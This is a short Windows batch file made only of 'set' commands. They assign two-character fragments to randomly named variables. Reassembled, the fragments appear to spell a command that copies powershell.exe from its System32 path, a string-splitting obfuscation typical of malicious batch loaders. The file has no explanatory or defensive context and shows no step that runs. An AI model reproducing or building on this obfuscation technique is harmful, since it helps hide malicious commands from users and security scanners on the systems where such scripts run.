@echo off
set "fFkyYYIRan= C"
set "AOAOwNJcnA=Wi"
set "ZEJHqdKlGa=1."
set "mUBRPlwwHK=we"
set "RzCDHpZAYS=co"
set "aLcZrRIkye=Po"
set "patTaFxBeX=:\"
set "MlQMSnSRNA=y "
set "mSCVQGwrvm=py"
set "pFEAtytpjN=Sy"
set "OqxgqeAaiD=ws"
set "rlyLEiKXwi=xe"
set "VWlsPVAkPy=.e"
set "PgdXOMAzWH=ll"
set "CqlMGrtScR=0\"
set "bpTWeBFNgN=rs"
set "RQzMfDWmvG=\v"
set "qtWvrspPlj=st"
